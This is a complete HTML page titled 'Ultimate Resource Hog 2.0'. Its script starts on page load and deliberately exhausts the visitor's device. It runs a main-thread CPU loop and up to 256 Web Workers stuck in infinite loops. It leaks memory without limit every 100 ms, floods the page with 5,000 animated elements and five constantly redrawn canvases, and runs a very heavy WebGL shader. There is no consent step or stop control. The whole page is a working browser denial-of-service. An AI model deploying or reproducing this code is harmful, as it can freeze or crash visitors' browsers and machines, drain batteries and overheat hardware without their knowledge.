<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title>Ultimate Resource Hog 2.0</title>
    <style>
        body {
            margin: 0;
            background: black;
            color: white;
            font-family: monospace;
            overflow: hidden;
        }

        #levelDisplay {
            position: fixed;
            top: 10px;
            left: 10px;
            z-index: 1000;
            font-size: 20px;
        }

        .particle {
            position: absolute;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.9), rgba(255, 0, 0, 0.3));
            animation: spin 0.2s linear infinite, glow 0.1s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg) translateX(50vw);
            }
            100% {
                transform: rotate(360deg) translateX(50vw);
            }
        }

        @keyframes glow {
            0%, 100% {
                opacity: 0.3;
                box-shadow: 0 0 10px rgba(255, 255, 255, 0.7);
            }
            50% {
                opacity: 1;
                box-shadow: 0 0 30px rgba(255, 255, 255, 1);
            }
        }

        canvas, .canvas2d {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -1;
        }
    </style>
</head>
<body>
<div id="levelDisplay">Level: MAX</div>
<canvas id="glCanvas"></canvas>

<script>
    let workers = [];
    const level = 10;
    const maxWorkers = Math.min(navigator.hardwareConcurrency * 8, 256);

    // Ultra CPU hog main thread
    function burnCpu() {
        let result = 0n;
        for (let i = 0n; i < 1000000n; i++) {
            result += BigInt(Math.floor(Math.random() * 10));
        }
        setTimeout(burnCpu, 1);
    }

    burnCpu();

    // Memory leak simulation
    const memoryHog = [];
    setInterval(() => {
        for (let i = 0; i < 10000; i++) {
            memoryHog.push(new Array(1000).fill(Math.random()));
        }
    }, 100);

    // Ultra Web Workers
    const workerCode = `
      self.onmessage = function() {
        let r = 0;
        while (true) {
          for (let i = 0; i < 10000; i++) {
            r += Math.sin(Math.random() * i);
            r += Math.sqrt(Math.random() * i);
            r += Math.log(Math.random() + 1);
          }
        }
      };
    `;
    const blob = new Blob([workerCode], {type: "application/javascript"});
    const workerURL = URL.createObjectURL(blob);
    for (let i = 0; i < maxWorkers; i++) {
        const w = new Worker(workerURL);
        w.postMessage({});
        workers.push(w);
    }

    // DOM Overload
    function spawnDomParticles() {
        for (let i = 0; i < 5000; i++) {
            const p = document.createElement("div");
            p.className = "particle";
            p.style.left = Math.random() * 100 + "vw";
            p.style.top = Math.random() * 100 + "vh";
            p.style.filter = `blur(${Math.random()}px)`;
            document.body.appendChild(p);
        }
    }

    spawnDomParticles();

    // 2D Canvas stress
    for (let i = 0; i < 5; i++) {
        const canvas2D = document.createElement("canvas");
        canvas2D.className = "canvas2d";
        canvas2D.width = innerWidth;
        canvas2D.height = innerHeight;
        document.body.appendChild(canvas2D);
        const ctx = canvas2D.getContext("2d");
        setInterval(() => {
            for (let i = 0; i < 1000; i++) {
                ctx.fillStyle = `rgba(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255},0.2)`;
                ctx.beginPath();
                ctx.arc(Math.random() * innerWidth, Math.random() * innerHeight, 10, 0, 2 * Math.PI);
                ctx.fill();
            }
        }, 50);
    }

    // WebGL Ultra Shader
    const canvas = document.getElementById("glCanvas");
    const gl = canvas.getContext("webgl");
    canvas.width = innerWidth;
    canvas.height = innerHeight;

    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, `
      attribute vec2 a_position;
      void main() {
        gl_Position = vec4(a_position, 0.0, 1.0);
      }
    `);
    gl.compileShader(vs);

    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, `
      precision highp float;
      uniform float u_time;
      uniform vec2 u_resolution;
      void main() {
        vec2 uv = gl_FragCoord.xy / u_resolution;
        float color = 0.0;
        for (float i = 0.0; i < 1500.0; i++) {
          color += sin(uv.x * cos(u_time + i) * 10.0) * cos(uv.y * sin(u_time + i) * 10.0);
          color += fract(sin(dot(uv, vec2(12.9898, 78.233))) * 43758.5453);
        }
        gl_FragColor = vec4(vec3(color * 0.05, color * 0.02, color * 0.08), 1.0);
      }
    `);
    gl.compileShader(fs);

    const prog = gl.createProgram();
    gl.attachShader(prog, vs);
    gl.attachShader(prog, fs);
    gl.linkProgram(prog);
    gl.useProgram(prog);

    const verts = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
    const buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);

    const posLoc = gl.getAttribLocation(prog, "a_position");
    gl.enableVertexAttribArray(posLoc);
    gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);

    const timeLoc = gl.getUniformLocation(prog, "u_time");
    const resLoc = gl.getUniformLocation(prog, "u_resolution");
    gl.uniform2f(resLoc, canvas.width, canvas.height);

    function render() {
        gl.uniform1f(timeLoc, performance.now() / 1000);
        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
        requestAnimationFrame(render);
    }

    render();
</script>
</body>
</html>